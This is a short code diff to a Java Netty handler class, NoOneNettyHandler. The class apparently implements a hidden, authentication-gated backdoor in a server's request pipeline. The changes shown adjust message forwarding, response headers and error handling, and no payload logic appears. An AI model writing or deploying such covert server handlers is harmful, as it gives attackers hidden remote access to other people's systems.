@@ -17,6 +17,7 @@ import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.net.URL;
 import java.net.URLClassLoader;
+import java.util.Arrays;
 import java.util.zip.GZIPInputStream;
 
 @ChannelHandler.Sharable
@@ -34,8 +35,6 @@ public class NoOneNettyHandler extends ChannelDuplexHandler {
                 ctx.fireChannelRead(msg);
                 return;
             }
-            ReferenceCountUtil.release(msg);
-            return;
         }
         if (msg instanceof HttpContent) {
             if (!authed) {
@@ -67,21 +66,17 @@ public class NoOneNettyHandler extends ChannelDuplexHandler {
                             HttpResponseStatus.OK,
                             Unpooled.wrappedBuffer(data)
                     );
+                    response.headers().set("Content-Type", "text/plain; charset=UTF-8");
+                    response.headers().set(HttpHeaderNames.CONTENT_LENGTH, response.content().readableBytes());
                     wrapResponse(response);
-                    ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE_ON_FAILURE);
-                } finally {
-                    accumulated.release();
-                    accumulated = null;
-                    authed = false;
-                    ReferenceCountUtil.release(msg);
+                    ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);
+                } catch (Throwable e) {
+                    e.printStackTrace();
                 }
                 return;
-            } else {
-                ReferenceCountUtil.release(msg);
-                return;
             }
+            ctx.fireChannelRead(msg);
         }
-        ctx.fireChannelRead(msg);
     }
 
     @Override
